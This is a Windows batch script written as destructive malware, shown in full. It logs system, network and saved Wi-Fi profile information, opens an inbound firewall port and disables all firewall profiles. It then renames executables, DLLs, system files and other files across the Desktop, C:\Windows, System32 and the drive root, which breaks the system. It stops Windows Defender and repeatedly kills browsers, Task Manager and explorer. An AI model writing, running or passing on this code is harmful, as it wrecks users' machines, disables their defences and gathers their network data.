@echo off
title %random% %date% %username% %time% %random%
color 0a
rem Writes INFO to a .LOG file in Current Directory
:info
cls & color 0a
cd Desktop
nslookup ip.dns.com resolver1.dns.com>bvz.log
ver>>bvz.log
ECHO.>>bvz.log
ECHO Username:%username%>>bvz.log
ECHO.>>bvz.log
ECHO Time: %time%>>bvz.log
ECHO.>>bvz.log
ECHO Date: %date%>>bvz.log
ECHO.>>bvz.log
netsh wlan show profiles>>bvz.log
ECHO.>>bvz.log
ipconfig>>bvz.log
ECHO.>>bvz.log
ECHO Additional Information:>>bvz.log
ipconfig | find /i "IPv4">>bvz.log
wmic diskdrive get size>>bvz.log
wmic cpu get name>>bvz.log
ECHO.>>bvz.log
ECHO.>>bvz.log
ECHO.>>bvz.log
systeminfo>>bvz.log
goto ports
rem Opens Port 1122
:ports
cls & color 0a
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto firewall
rem Turns all Firewalls off
:firewall
cls & color 0a
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
goto encryption
rem name breaks files
:encryption
cls & color 0a
:Current
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
color 0a & mode 1000 & cls
pause
goto kill
rem Closes all task managers and browser, kills anti-virus and firewall
:kill
net stop "Windows Defender Service"
net stop "Windows Firewall"
taskkill /F /IM "chrome.exe" /T
taskkill /F /IM "firefox.exe" /T
taskkill /F /IM "ProcessHacker.exe" /T
taskkill /F /IM "explorer.exe" /T
taskkill /F /IM "taskmgr.exe" /T
goto kill